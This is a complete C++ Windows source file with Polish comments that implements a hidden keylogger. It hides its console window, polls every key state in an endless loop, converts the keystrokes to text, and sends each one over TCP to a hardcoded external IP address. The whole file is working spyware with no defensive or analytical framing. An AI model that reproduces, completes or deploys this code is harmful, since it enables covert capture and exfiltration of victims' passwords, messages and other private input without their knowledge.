#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <unordered_map>
#include <locale>
#include <codecvt>

#pragma comment(lib, "ws2_32.lib")

// Mapa specjalnych klawiszy
std::unordered_map<int, std::string> specialKeys = {
    {VK_BACK, "BACKSPACE"}, {VK_TAB, "TAB"},     {VK_RETURN, "ENTER"},
    {VK_SHIFT, "SHIFT"},    {VK_CONTROL, "CTRL"}, {VK_MENU, "ALT"},
    {VK_PAUSE, "PAUSE"},    {VK_CAPITAL, "CAPSLOCK"}, {VK_ESCAPE, "ESC"},
    {VK_SPACE, "SPACE"},    {VK_PRIOR, "PAGEUP"}, {VK_NEXT, "PAGEDOWN"},
    {VK_END, "END"},        {VK_HOME, "HOME"},   {VK_LEFT, "LEFT"},
    {VK_UP, "UP"},          {VK_RIGHT, "RIGHT"}, {VK_DOWN, "DOWN"},
    {VK_INSERT, "INSERT"},  {VK_DELETE, "DELETE"},{VK_NUMLOCK, "NUMLOCK"},
    {VK_SCROLL, "SCROLLLOCK"},{VK_LWIN, "LWIN"}, {VK_RWIN, "RWIN"},
    {VK_LSHIFT, "LSHIFT"},  {VK_RSHIFT, "RSHIFT"},{VK_LCONTROL, "LCTRL"},
    {VK_RCONTROL, "RCTRL"}, {VK_LMENU, "LALT"},  {VK_RMENU, "RALT"}
};

// Zamiana wchar_t na UTF-8
std::string toUtf8(wchar_t wch) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> conv;
    return conv.to_bytes(wch);
}

// Wysyłanie klawisza do serwera
void sendKey(SOCKET sock, const std::string& key) {
    std::string message = key + "\n";
    send(sock, message.c_str(), message.size(), 0);
}

// Ukrywanie okna konsoli
void HideConsole() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HideConsole();

    // Inicjalizacja Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Tworzenie socketu
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return 1;

    // Konfiguracja adresu serwera
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(25565);
    serverAddr.sin_addr.s_addr = inet_addr("144.24.189.124"); // IP serwera

    // Połączenie z serwerem
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) != 0) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Główna pętla keyloggera
    while (true) {
        for (int key = 1; key < 256; ++key) {
            SHORT state = GetAsyncKeyState(key);
            if (state & 0x8000) {
                if (specialKeys.count(key)) {
                    sendKey(sock, specialKeys[key]);
                }
                else {
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    wchar_t buffer[4];
                    int result = ToUnicode(key, MapVirtualKey(key, MAPVK_VK_TO_VSC), keyboardState, buffer, 4, 0);

                    if (result > 0) {
                        std::string utf8Char = toUtf8(buffer[0]);
                        sendKey(sock, utf8Char);
                    }
                }

                Sleep(100); // zapobiega wielokrotnemu wysyłaniu
            }
        }
        Sleep(10);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
